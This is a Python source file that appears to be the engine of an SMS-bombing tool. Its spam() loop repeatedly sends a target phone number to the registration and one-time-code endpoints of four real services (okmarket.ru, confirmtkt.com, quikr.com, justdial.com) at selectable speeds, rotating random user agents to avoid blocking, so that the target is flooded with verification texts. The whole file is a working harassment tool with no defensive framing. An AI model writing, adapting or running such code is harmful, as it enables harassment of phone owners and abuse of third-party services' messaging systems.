import time
import requests
import requests_random_user_agent
import config


from random import choice


# user agent
user_agent = open(requests_random_user_agent.USER_AGENTS_FILE,"r").read()
user_agents = user_agent.split("\n")

service = [1,2,3,4]

# spam to number
def spam(id, num):
    # fast speed
    if config.type_spam[id] == 2:
        while ...:
            if config.stop_spam[id] == True:
                break
            random_func = choice(service)

            if random_func == 1:
                spam1(num)
            elif random_func == 2:
                spam2(num)
            elif random_func == 3:
                spam3(num)
            elif random_func == 4:
                spam4(num)


            config.add_mess_db(id)
            config.quantity_send_message[id] += 1
            time.sleep(1)

    # average speed
    elif config.type_spam[id] == 1:
        while ...:
            if config.stop_spam[id] == True:
                break
            config.quantity_send_message[id] += 1
            config.add_mess_db(id)

            random_func = choice(service)

            if random_func == 1:
                spam1(num)
            elif random_func == 2:
                spam2(num)
            elif random_func == 3:
                spam3(num)
            elif random_func == 4:
                spam4(num)

            time.sleep(1.5)

    # slow speed
    else:
        start_time = int(time.strftime("%m"))
        if start_time + 10 > 60:
            end_time = start_time + 10 - 60
        else:
            end_time = start_time + 10
        while ...:
            if int(time.strftime("%m")) >= end_time:
                break
            if config.stop_spam[id] == True:
                break

            random_func = choice(service)

            if random_func == 1:
                spam1(num)
            elif random_func == 2:
                spam2(num)
            elif random_func == 3:
                spam3(num)
            elif random_func == 4:
                spam4(num)

            config.quantity_send_message[id] += 1
            config.add_mess_db(id)
            time.sleep(3)




def spam1(num):
    print(1)
    agent = choice(user_agents)
    headers = {"User-Agent": agent}
    url = "https://www.okmarket.ru/ajax/personal/register/?lang=ru&phone=" + num
    req = requests.get(url, headers=headers)
    print(req)

def spam2(num):
    print(2)
    agent = choice(user_agents)
    headers = {"User-Agent": agent}
    print(requests.get("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + num, headers=headers))

def spam3(num):
    print(3)
    agent = choice(user_agents)
    headers = {"User-Agent": agent}
    print(requests.get("http://www.quikr.com/SignIn?aj=1&for=send_otp&user=" + num, headers=headers))

def spam4(num):
    print(4)
    agent = choice(user_agents)
    headers = {"User-Agent": agent}
    print(requests.get("http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=" + num, headers=headers))
